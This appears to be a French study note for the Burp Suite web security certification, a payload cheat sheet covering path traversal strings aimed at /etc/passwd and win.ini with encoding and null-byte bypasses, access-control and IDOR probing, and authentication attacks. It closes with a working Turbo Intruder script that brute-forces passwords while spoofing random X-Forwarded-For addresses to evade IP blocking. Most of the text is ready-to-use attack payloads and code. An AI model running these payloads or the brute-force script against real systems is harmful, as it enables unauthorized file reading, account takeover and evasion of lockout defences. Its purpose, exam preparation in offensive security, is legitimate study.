---
tags: [bscp, essentiel, payloads]
statut: en cours
---
# Fiche de payloads par vulnérabilité

### Path traversal ([[Path-traversal]])
- Traversal simple (Unix) : `../../../etc/passwd`
- Traversal simple (Windows) : `..\..\..\windows\win.ini`
- Séquences imbriquées (contournement d'un retrait non récursif de `../`) : `....//` ou `....\/`
- Encodage simple : `%2e%2e%2f`
- Double encodage : `%252e%252e%252f`
- Encodage non standard : `%c0%af` ou `..%ef%bc%8f`
- Contournement validation de préfixe (chemin absolu) : `filename=/var/www/images/../../../etc/passwd`
- Contournement validation d'extension (null byte) : `filename=../../../etc/passwd%00.png`
- Liste Burp Intruder dédiée : **Fuzzing - path traversal**

### Access control ([[Access-control]])
- Accès direct à une fonction non liée dans l'UI : deviner/forcer l'URL, ex. `/admin`, `/administrator-panel-<suffixe>`
- Emplacements où chercher une URL sensible divulguée : `/robots.txt`, `sitemap.xml`, code JavaScript de l'interface
- Contournement par paramètre de rôle contrôlable côté client : `?admin=true`, `?role=1`
- Escalade horizontale / IDOR par manipulation d'identifiant : `?id=123` à tester avec d'autres valeurs (`?id=124`, `?id=1`, etc.) sous un compte différent
- Ne pas se limiter au verbe HTTP utilisé par l'UI : rejouer la même requête en GET/POST/PUT/DELETE sur l'endpoint sensible

### Authentication ([[Authentication]])
- Noms d'utilisateur à tester en priorité : `admin`, `administrator`, schéma `prenom.nom@domaine`
- Mutations de mot de passe prévisibles à tester en brute force ciblé : `Password1!`, `Passw0rd`, `<motclé><année>!`, substitutions leet (`o`→`0`, `a`→`4`, `e`→`3`)
- En-tête pour contourner un blocage par IP : `X-Forwarded-For: <ip aléatoire>` (tester aussi `X-Real-IP`, `X-Client-IP`, `True-Client-IP`)
- Authentification HTTP Basic : `Authorization: Basic base64(username:password)`
- Script Turbo Intruder pour bypass de blocage IP (1 seul marqueur position password, IP injectée par remplacement de texte sur `target.req`) :
  ```python
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                              concurrentConnections=1,
                              requestsPerConnection=1,
                              pipeline=False
                              )

      for password in wordlists.clipboard:
          ip = "%d.%d.%d.%d" % (
              randint(1, 255), randint(1, 255), randint(1, 255), randint(1, 255)
          )
          req = target.req.replace("1.1.1.1", ip)
          engine.queue(req, password)


  def handleResponse(req, interesting):
      table.add(req)
  ```
